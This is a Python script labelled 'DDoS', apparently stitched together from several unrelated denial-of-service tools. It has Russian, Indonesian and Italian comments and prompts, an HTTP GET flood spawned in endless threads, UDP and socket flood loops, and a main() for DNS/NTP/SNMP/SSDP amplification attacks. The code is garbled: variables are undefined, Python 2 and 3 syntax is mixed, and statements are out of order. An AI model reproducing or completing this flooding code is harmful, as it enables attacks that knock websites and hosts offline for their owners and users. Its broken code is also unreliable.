# DDoS
import threading
import requests
import random
import os
import sys
import time
import colored
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
print("З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print "<===============================>"         
print "||========>DDoS  HTTP<=========||"
print "<===============================>"

targ = input("Cсылку для атаки: ")
port = input("Port       ===> ")
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100000000000
     port = port + 1
     print "mengirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

def dos():
 while True:
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()

# DDoS
print(  "Zapusk")
while True:
    try:
        s = socket.socket(999999999)
        s.connect((upl, int(theard)))
        sent +=0
        print(green + f"[LOG] GO {sent} ")
        print("DDoS")
    except OSError: 
        error +=1
        print(pink + f"[LOG] PACKETS {error}")
        "print(cyan + f( DDoS)"

def main():
	parser = OptionParser(usage=USAGE)
	for args, kwargs in OPTIONS:
		parser.add_option(*args, **kwargs)
	options, args = parser.parse_args()
	domains = None
	if len(args)<1:
		parser.print_help()
		sys.exit()
	if options.dns:
		dns_file, domains = options.dns.split(':')
		domains = GetDomainList(domains)
		if domains:
			files['dns'] = [dns_file]
		else:
			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
			sys.exit()
	if options.ntp:
		files['ntp'] = [options.ntp]
	if options.snmp:
		files['snmp'] = [options.snmp]
	if options.ssdp:
		files['ssdp'] = [options.ssdp]
	if files:
		event = threading.Event()
		event.set()
		if 'BENCHMARK'==args[0].upper():
			ddos = DDoS(args[0], options.threads, domains, event)
			Benchmark(ddos)
		else:
			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event)
			ddos.stress()
			Monitor()
			event.clear()
	else:
		parser.print_help()
		sys.exit()

if __name__=='__main__':
	print LOGO
	main()
	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco. 
